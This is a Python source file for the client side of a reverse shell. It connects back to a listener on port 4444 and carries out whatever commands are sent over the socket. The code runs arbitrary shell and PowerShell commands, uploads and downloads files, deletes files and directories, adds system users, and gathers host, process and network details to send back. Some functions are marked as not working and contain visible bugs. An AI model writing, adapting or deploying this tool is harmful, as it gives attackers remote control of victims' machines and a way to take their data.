# Basic Reverse Shell - Client Side #

import getpass
import platform
import socket
import subprocess
import os
import sys
import time
from fileinput import filename
from getpass import getuser, getpass

uname = platform.uname()[0]
get_user = getuser()
s = socket.socket()
IP = "127.0.0.1"
PORT = 4444
BUF_SIZE = 2048
FORMAT = 'utf-8'

OS = platform.platform()

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        break
    except ConnectionRefusedError:
        print("Connections refused")
        s.close()
        continue


def main():
    reverse_shell()
    s.close()


def reverse_shell():
    while True:
        cwd = os.getcwd()
        username = str(getuser())
        if username == 'root':
            cli = f"{username}:{cwd}#"
            s.send(cli.encode(FORMAT))
        else:
            cli = f"{cwd}$"
            s.send(cli.encode(FORMAT))
        # try:
        output = s.recv(BUF_SIZE).decode(FORMAT)
        output_split = output.split(" ")
        if "exit" == output:
            s.close()
            exit()
        elif "cd" == output_split[0] and "-" in output:
            cd_dash(OS)
            continue
        elif "cd" in output_split[0].lower() and "/" in output:
            cd_path(output_split, OS)
            continue
        elif "cd" in output.lower() and "/" not in output:
            cd_empty(OS)
            continue
        elif "ls" == output_split[0].lower() and ("/" not in output or "C:/" not in output.upper()):
            ls_empty(cwd)
            continue
        elif "ls" == output_split[0].lower() and ("/" not in output or "C:/" not in output.upper()):
            ls_path(output_split)
            continue
        elif "rm -f" in output.lower() and ("/" not in output or "/" in output):
            rm_file(output_split)
            continue
        elif "rm -d" in output.lower() and ("/" not in output or "/" in output):
            rm_dir(output_split)
            continue
        elif "mkdir" == output_split[0].lower() and ("/" in output or "/" not in output):
            mkdir(output, output_split)
            continue
        elif "touch" == output_split[0].lower() and "/" in output:
            touch_path(output)
            continue
        elif "touch" == output_split[0].lower() and "/" not in output:
            touch_file(output_split)
            continue
        elif "start" == output_split[0].lower() and ("/" not in output or "/" in output):
            start_file(output_split, OS)
            continue
        elif "help" == output_split[0].lower() or "help" in output.lower():
            continue
        elif "ifconfig" == output_split[0].lower() or "ifconfig" in output.lower():
            ifconfig(OS)
            continue
        elif "powershell" == output_split[0].lower() or "powershell" in output.lower() and 'Windows' in OS:
            powershell(OS, output)
            continue
        elif "sysinfo" in output.lower():
            sysinfo()
            continue
        elif output.lower() == "exit":
            print("\t[!][!][!]  ! EXITING !  [!][!][!]\n")
            return "exit"
        elif "pwd" == output_split[0].lower() or output.startswith("pwd"):
            pwd(OS, output)
            continue
        elif "ps" in output.lower():
            ps()
            continue
        elif "upload" in output.lower():
            upload(output)
            continue
        elif "chmod" in output.lower():
            # chmod()
            pass
        elif "adduser" in output.lower():
            add_user()
        elif "down " in output.lower():
            down_file(output_split)
        else:
            other_command(output)
            continue
    # except AttributeError as i:
    #     s.send(f"wrong options, Error: {i}".encode('utf-8'))
    #     continue
    # except Exception as e:
    #     s.send(f"the problem is : {e}".encode('utf-8'))
    #     continue
    # except BrokenPipeError as d:
    #     s.send(f"wrong options, Error: {d}".encode('utf-8'))
    #     continue
    # except KeyboardInterrupt as o:
    #     s.send(f"wrong options, Error: {o}".encode('utf-8'))
    #     continue


def powershell(OS, output):
    output = output.split("powershell ")
    message = os.system(f'powershell -Command "{output}"')
    s.send(message.encode('utf-8'))


def sysinfo():
    global sysinfo
    sysinfo = (f"\n"
               f"            [*] Operating System: {platform.system()}\n"
               f"            [*] Computer Name: {platform.node()}\n"
               f"            [*] Username: {get_user}\n"
               f"            [*] Release Version: {platform.release()}\n"
               f"            [*] Processor Architecture: {platform.processor()}")
    s.send(sysinfo.encode('utf-8'))
    return sysinfo


def pwd(OS, output):
    if "Linux" in OS:
        other_command(output)
    elif "Windows" in OS:
        pwd = subprocess.getoutput("echo %cd%")
        s.send(pwd.encode('utf-8'))


def cd_path(output_split, OS):
    # working (not working in windows)
    global path
    if "Linux" in OS:
        for i in output_split:
            if "/" in i:
                path = i
        os.chdir(path)
        s.send(path.encode(FORMAT))
    elif "Windows" in OS:
        pass


def cd_empty(OS):
    # working
    global path
    if "Linux" in OS:
        path = "/"
        os.chdir("/")
    elif "Windows" in OS:
        path = "C:\\"
        os.chdir("C:\\")
    message1 = f"You in: {path}"
    s.send(message1.encode(FORMAT))


def upload(output):
    # We can send file sample.txt
    command1 = output[1]
    file = open(fr"{output}", "rb")
    SendData = file.read(1024)

    while SendData:
        # Now we can receive data from server
        print("\n\n[*][*][*] Below message is received from server [*][*][*] \n\n ",
              s.recv(1024).decode(FORMAT))
        # Now send the content of sample.txt to server
        s.send(SendData)
        SendData = file.read(1024)


def down_file(output):
    # need to check
    filename = output[1]
    with open(fr'{filename}', 'wb') as file_to_write:
        while True:
            data = s.recv(BUF_SIZE * 10).decode(FORMAT)
            if not data:
                break
            file_to_write.write(bytes(data))
        file_to_write.close()


def cd_dash(OS):
    # still work not compliantly
    if "Linux" in OS:
        path = os.path.dirname(os.dir())
        print(path)
        os.chdir(path)
        message1 = f"You in: {path}"
        s.send(message1.encode(FORMAT))
    elif "Windows" in OS:
        pass


def cd_dot(OS):
    # working (still not work with windows)
    if "Linux" in OS:
        os.chdir('..')
        path = os.path.dirname(os.getcwd())
        message1 = f"You in: {path}"
        s.send(message1.encode(FORMAT))
    elif "Windows" in OS:
        pass


def add_user():
    # need to check
    username = input("Enter Username ")
    password = getpass.getpass()
    print(password)
    try:
        subprocess.run(['useradd', '-p', password, username])
        s.send(f"User added: {username}".encode(FORMAT))
    except:
        s.send(f"Failed to add user: {username}".encode(FORMAT))


# def chmod():
#     a = chmo
#     b =
#     c =
#     d =
#     e =
#     f=
#     os.chmod()
# def chown():
#     # not working yet
#     os.chown()
#     pass


def ls_empty(cwd):
    # working
    dirlist = os.listdir()
    dirlist = str(", \n".join(dirlist))
    dirlist = f"Content of:{cwd}\n{dirlist}"
    s.send(dirlist.encode(FORMAT))


def ls_path(output_split):
    # working
    global path
    for i in output_split:
        if "/" in i:
            path = i
    dirlist = os.listdir(f"{path}")
    dirlist = ", \n".join(dirlist)
    dirlist = f"Content of:{path}\n{str(dirlist)}"
    s.send(dirlist.encode(FORMAT))


def rm_file(output_split):
    # working
    file = output_split[2]
    try:
        os.remove(f"{file}")
    except FileNotFoundError as e:
        s.send(f"{e}".encode(FORMAT))
    s.send("File removed".encode(FORMAT))


def rm_dir(output_split):
    # working
    directory = output_split[2]
    try:
        os.removedirs(f"{directory}")
    except NotADirectoryError as e:
        s.send(f"{e}".encode(FORMAT))
    except IsADirectoryError as e:
        s.send(f"{e}".encode(FORMAT))
    s.send("Directory removed".encode(FORMAT))


def mkdir(output, output_split):
    # working
    try:
        directory = output_split[1]
        subprocess.check_output(output, shell=True)
        s.send(f"The directory is created {directory}".encode(FORMAT))
    except Exception as e:
        s.send(f"There is a problem with: {e}".encode(FORMAT))
    except IsADirectoryError as e:
        s.send(f"There is a problem with: {e}".encode(FORMAT))
    except NotADirectoryError as e:
        s.send(f"There is a problem with: {e}".encode(FORMAT))


def touch_path(output):
    # not working
    list1 = output.strip("touch")
    list1 = list1.split('/')
    path = "/"
    for i in list1:
        if path == "/":
            path = + i
        path = path + i + "/"
    with open(fr'{path}', "w") as file:
        file.write("")
    s.send(f"Created a file: {path}")


def touch_file(output_split):
    # not working
    path = output_split[1]
    with open(fr'{path}', "w") as file:
        file.write("")
    s.send(f"Created a file: {path}")


def start_file(output_split, OS):
    # not working
    try:
        path = output_split[1]
        if "Windows" in OS:
            os.startfile(path)
            message = f"Starting the file {path}"
            s.send(message.encode(FORMAT))
        elif "Linux" in OS:
            message = str(subprocess.check_output(f"{path}", shell=True))
            message = message.rstrip('b\'')
            message = message.split('\\n')
            message = message[0].split('b\'')
            message = message[1]
            message = str(f"{message}")
            message = f"Starting the file: {path}\n{message}"
            s.send(message.encode(FORMAT))
    except subprocess.CalledProcessError as e:
        s.send(e.encode(FORMAT))
        pass
    except subprocess.SubprocessError as e:
        s.send(e.encode(FORMAT))
        pass


def other_command(output):
    # working
    output = str(subprocess.check_output(output, shell=True))
    output = output.rstrip('b\'')
    output = output.split('\\n')
    output = output[0].split('b\'')
    output = output[1]
    message = str(f"{output}")
    s.send(message.encode(FORMAT))


def ps():
    # working
    ps = subprocess.getoutput('ps -aux')
    output1 = str(ps)
    sending = "The process list:\n"
    for i in output1.split("\n"):
        if "\n" in i:
            pass
        elif "+" in i:
            sending = f"{sending} + {i}\n"
    s.send(sending.encode(FORMAT))


def ifconfig(OS):
    # Working
    def linux():
        global IP
        IP = subprocess.getoutput("hostname -I")
        IP = IP.split(" ")
        IP.remove(IP[-1])
        IP_lo = subprocess.getoutput("hostname -i")
        interface = subprocess.getoutput("ifconfig -a | sed 's/[ \\t].*//;/^$/d'")
        interfaces = interface.split("\n")
        sending = ""
        if "127" in IP_lo:
            for i in interfaces:
                if "lo:" in i:
                    sending = f"{i}{IP_lo}\n"
                    interfaces.remove(i)
                    continue
                continue
        else:
            pass
        for i in interfaces:
            for t in IP:
                if i not in sending:
                    f = f"{i}{t}\n"
                    sending = sending + f
                    continue
                else:
                    continue
        s.send(sending.encode(FORMAT))

    def windows():
        output = subprocess.getoutput('ipconfig | findstr /i "IPv4"')
        output = output.split(":")
        out = subprocess.getoutput('ipconfig | findstr /i "Gateway"')
        out = out.split(":")
        sending = ""
        if "IPv4" in output[0]:
            for i in output:
                if "IPv4" in i:
                    continue
                else:
                    sending = sending + f"IP: {i}\n"
                    continue
            for i in out:
                if "Gateway" in i:
                    continue
                else:
                    sending = sending + f"Gateway: {i}\n"
                    continue
            s.send(sending.encode(FORMAT))

    if "Linux" in OS:
        linux()
    elif "Windows" in OS:
        windows()
    else:
        s.send("Don't know how to work in this OS".encode(FORMAT))


if __name__ == '__main__':
    main()
    s.close()
